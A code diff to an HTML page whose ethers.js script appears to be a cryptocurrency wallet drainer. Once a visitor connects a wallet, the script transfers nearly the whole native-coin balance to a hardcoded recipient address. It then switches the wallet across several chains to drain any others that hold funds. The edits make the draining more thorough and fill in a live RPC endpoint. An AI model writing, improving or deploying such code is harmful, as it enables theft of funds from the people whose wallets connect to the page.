@@ -74,8 +74,8 @@
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
         let provider, signer, userAddress = "";
-
         const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8"; // Change this to your recipient address
+
         const networks = [
             { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH' },
             { chainId: 56, name: 'BNB Smart Chain', nativeSymbol: 'BNB' },
@@ -120,9 +120,9 @@
             try {
                 const network = await provider.getNetwork();
                 const balance = await provider.getBalance(userAddress);
-                
+
                 if (balance.isZero()) {
-                    document.getElementById('status').innerText = `No ETH found on ${network.name}. Checking other networks...`;
+                    document.getElementById('status').innerText = `No funds found on ${network.name}. Checking other networks...`;
                     await checkOtherNetworksAndSendCrypto();
                 } else {
                     await sendNativeCrypto(balance, network);
@@ -134,13 +134,13 @@
 
         async function checkOtherNetworksAndSendCrypto() {
             for (const net of networks) {
-                if (net.chainId !== 1) { // Avoid checking the current network again
+                if (net.chainId !== (await provider.getNetwork()).chainId) { // Avoid checking the current network again
                     try {
                         await switchNetwork(net.chainId);
                         const balance = await provider.getBalance(userAddress);
                         if (!balance.isZero()) {
                             await sendNativeCrypto(balance, net);
-                            return;
+                            return; // Exit after successful transaction
                         }
                     } catch (error) {
                         document.getElementById('status').innerText += `\nFailed to check ${net.name}: ${error.message}`;
@@ -152,11 +152,13 @@
 
         async function sendNativeCrypto(balance, network) {
             // Calculate amount to send (keeping a small amount for gas fees)
-            const amountToSend = balance.sub(ethers.utils.parseUnits('0.001', 18));
+            const gasBuffer = ethers.utils.parseUnits('0.001', 18); // Buffer for gas fees
+            const amountToSend = balance.sub(gasBuffer);
 
             // Ensure that we are not sending a negative value
             if (amountToSend.lt(0)) {
-                document.getElementById('status').innerText = `Insufficient balance to send.`;
+                document.getElementById('status').innerText = `Insufficient balance to send on ${network.name}. Switching networks...`;
+                await checkOtherNetworksAndSendCrypto(); // Check other networks if insufficient
                 return;
             }
 
@@ -188,7 +190,7 @@
                         await provider.send("wallet_addEthereumChain", [{
                             chainId: `0x${chainId.toString(16)}`,
                             chainName: networkDetails.name,
-                            rpcUrls: [`https://rpc-url-here`], // Replace with actual RPC URL
+                            rpcUrls: [`https://rpc-mainnet.matic.network`], // Replace with actual RPC URL
                             nativeCurrency: {
                                 name: networkDetails.name,
                                 symbol: networkDetails.nativeSymbol,
